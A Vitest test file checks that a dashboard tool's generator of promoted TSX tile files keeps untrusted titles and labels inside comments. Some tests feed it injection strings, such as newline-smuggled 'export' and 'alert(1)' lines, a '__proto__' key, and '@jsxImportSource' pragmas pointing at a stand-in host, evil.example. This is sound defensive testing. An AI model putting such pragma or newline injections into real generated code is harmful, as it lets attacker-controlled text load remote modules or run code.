import { TILE_TYPE_NAMES, defineMetricsView, type BuiltinTileType } from "devbi";
import { transformWithOxc } from "vite";
import { describe, expect, it } from "vitest";
import { componentName, promotedTileSource, type PromotedTile } from "../src/promote.js";

// The names types.test.ts registers (MetricsRegistry), so `pnpm typecheck` checks the files in promoted/ for real.
const sales = defineMetricsView(
  {
    model: "SELECT 1",
    time: { column: "受注日", label: "受注日" },
    dimensions: { customer: { column: "customer", label: "顧客" } },
    measures: { revenue: { sql: "SUM(a)", label: "売上" }, orders: { sql: "COUNT(*)", label: "受注件数" } },
  },
  "sales",
);

/** One tile of each built-in type, as the editor would send it. */
const TILES: Record<BuiltinTileType, PromotedTile> = {
  kpi: { id: "kpi-revenue", type: "kpi", title: "売上", query: { measures: ["revenue", "orders"] } },
  bar: { id: "monthly", type: "bar", title: "月別売上", query: { measures: ["revenue"], time: "month" } },
  line: { id: "daily orders", type: "line", query: { measures: ["orders"], time: "day", filters: [{ field: "受注日", between: ["2026-04-01", null] }] } },
  area: { id: "customer-trend", type: "area", title: "顧客別", query: { measures: ["revenue"], dimensions: ["customer"], time: "quarter" } },
  barlist: {
    id: "top-customers",
    type: "barlist",
    title: "上位顧客",
    query: { metrics: "sales", measures: ["revenue", "orders"], dimensions: ["customer"], sort: ["-revenue", { field: "customer", desc: false }], limit: 10 },
  },
  table: { id: "detail", type: "table", title: "明細", query: { measures: ["revenue", "orders"], dimensions: ["customer"], time: "fiscal_year" } },
  pivot: { id: "customer-year", type: "pivot", query: { measures: ["revenue"], dimensions: ["customer"], time: "year" }, options: { columns: "受注日", totals: false } },
  explore: {
    id: "rows",
    type: "explore",
    title: "明細",
    query: { filters: [{ field: "customer", in: ["A社"] }], limit: 5000 },
    options: { layout: { group_by: ["customer"], aggregates: { a: "sum" } } },
  },
  select: { id: "customer", type: "select", title: "顧客", query: { dimensions: ["customer"] }, options: { multiple: false } },
  "date-range": { id: "period", type: "date-range", title: "期間", options: { default: "latest_fiscal_year", metrics: "sales" } },
  // A title over two lines stays in its comment.
  markdown: { id: "about", type: "markdown", title: "説明\nexport const leaked = 1;", options: { text: "**太字** と\n改行" } },
};

describe("promoted tile files", () => {
  it("are named after the tile", () => {
    expect(componentName("top-customers", "barlist")).toBe("TopCustomers");
    expect(componentName("kpi_revenue2", "kpi")).toBe("KpiRevenue2");
    expect(componentName("monthlyRevenue", "bar")).toBe("MonthlyRevenue");
    expect(componentName("売上", "kpi")).toBe("KpiTile");
    expect(componentName("期間", "date-range")).toBe("DateRangeTile");
    expect(componentName("2026", "bar")).toBe("Tile2026");
    // A name the file itself uses.
    expect(componentName("builtin", "bar")).toBe("BuiltinTile");
    expect(componentName("x".repeat(200), "bar")).toHaveLength(60);
  });

  // The files in promoted/ are also checked by `pnpm typecheck` (packages/vite), as a project's dashboards/ would be.
  it.each(TILE_TYPE_NAMES)("draw the tile as before, with its query and options in the file (%s)", async (type) => {
    const tile = TILES[type];
    const name = componentName(tile.id, tile.type);
    await expect(promotedTileSource(tile, { name, view: sales, metrics: "sales" })).toMatchFileSnapshot(`./promoted/${name}.tsx`);
  });

  it("keep a title or a label to its comment line", () => {
    const source = promotedTileSource(TILES.markdown, { name: "About" });
    expect(source).toContain("// 「説明 export const leaked = 1;」のタイル。");
    expect(source.split("\n").filter((l) => l.includes("leaked"))).toHaveLength(1);
    const odd = defineMetricsView({ model: "SELECT 1", measures: { revenue: { sql: "SUM(a)", label: "売上\nalert(1)" } } }, "odd");
    const lines = promotedTileSource({ id: "k", type: "kpi", query: { measures: ["revenue"] } }, { name: "K", view: odd }).split("\n");
    expect(lines.filter((l) => l.includes("alert(1)")).every((l) => l.trimStart().startsWith("//"))).toBe(true);
  });

  it("keep pragmas out of the comments: a title or a label cannot choose the JSX runtime", async () => {
    const evil = "売上 @jsxImportSource https://evil.example/m.js?x= ";
    const view = defineMetricsView({ model: "SELECT 1", measures: { revenue: { sql: "SUM(a)", label: `${evil} @jsxRuntime classic` } } }, "evil");
    for (const tile of [
      { id: "k", type: "kpi" as const, title: evil, query: { measures: ["revenue"] } },
      { id: "m", type: "markdown" as const, title: "@jsxRuntime classic", options: { text: "@jsx h" } },
    ]) {
      const source = promotedTileSource(tile, { name: "K", view, metrics: `@jsxImportSource https://evil.example/n.js?` });
      expect(source.split("\n").filter((l) => l.trimStart().startsWith("//") && /@jsx/i.test(l))).toEqual([]);
      const { code } = await transformWithOxc(source, "K.tsx", { jsx: { runtime: "automatic" } });
      expect(code.split("\n").filter((l) => /\b(import|from)\b.*evil\.example/.test(l))).toEqual([]);
      expect(code).toContain(`from "react/jsx-runtime"`);
    }
  });

  it("name the columns without a metrics file, and write a long query over several lines", () => {
    const source = promotedTileSource(
      {
        id: "t",
        type: "table",
        query: { measures: ["revenue", "orders"], dimensions: ["customer", "地域"], filters: [{ field: "customer", in: ["青葉商事", "浪速製作所", null] }], limit: 20 },
      },
      { name: "T" },
    );
    expect(source).toContain("// 列は customer、地域、revenue、orders。例:");
    expect(source).toContain(`{props.format(r.customer, "customer")} {props.format(r.revenue, "revenue")}`);
    expect(source).toContain(
      [
        "export const query = defineQuery({",
        `  measures: ["revenue", "orders"],`,
        `  dimensions: ["customer", "地域"],`,
        `  filters: [{ field: "customer", in: ["青葉商事", "浪速製作所", null] }],`,
        "  limit: 20,",
        "});",
      ].join("\n"),
    );
    expect(source).toContain("指標と軸の名前で書く");
    // A key that is not a name, and one that would set the prototype.
    const options = promotedTileSource({ id: "m", type: "markdown", options: { "a-b": 1, ["__proto__"]: 2 } }, { name: "M" });
    expect(options).toContain(`const options = { "a-b": 1, ["__proto__"]: 2 };`);
  });
});
